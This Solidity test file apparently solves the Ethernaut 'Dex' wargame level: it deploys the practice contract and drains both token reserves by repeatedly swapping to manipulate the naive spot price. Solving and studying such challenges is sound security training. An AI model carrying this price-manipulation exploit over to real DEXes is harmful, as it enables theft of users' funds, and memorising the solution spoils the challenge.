// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Dex.sol";
import "src/levels/DexFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDex is BaseTest {
    Dex private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // To drain this DEX we need to manipulate the price of the tokens
        // It is possible to do this by swapping tokens back and forth, because contract uses simple ratio to calculate the price, e.g. spot price
        // We can swap until the DEX runs out of one of the tokens

        vm.startPrank(player, player);

        // Approve the DEX to spend the tokens for max typ uint256 for efficiency
        level.approve(address(level), type(uint256).max);

        // Initial swap to desync token balances
        uint256 firstSwap = token1.balanceOf(player);
        level.swap(level.token1(), level.token2(), firstSwap);

        // Swap back and forth until one of the tokens runs out
        while (token1.balanceOf(address(level)) > 0 && token2.balanceOf(address(level)) > 0) {
            if (token1.balanceOf(player) == 0) {
                // Get amount of token2 to swap
                uint256 amountIn = getAmountIn(token2, token1);

                level.swap(level.token2(), level.token1(), amountIn);
            } else if (token2.balanceOf(player) == 0) {
                // Get amount of token1 to swap
                uint256 amountIn = getAmountIn(token1, token2);

                level.swap(level.token1(), level.token2(), amountIn);
            }
        }

        vm.stopPrank();
    }

    function getAmountIn(ERC20 tokenIn, ERC20 tokenOut) internal view returns (uint256 amountIn) {
        amountIn = tokenIn.balanceOf(player);
        uint256 amountOut = level.getSwapPrice(address(tokenIn), address(tokenOut), amountIn);

        // If the amount out is greater than the balance of the DEX, the swap will fail, so we need to adjust the amountIn to the balance of the DEX
        if (amountOut > tokenOut.balanceOf(address(level))) {
            amountIn = tokenIn.balanceOf(address(level));
        }
    }
}
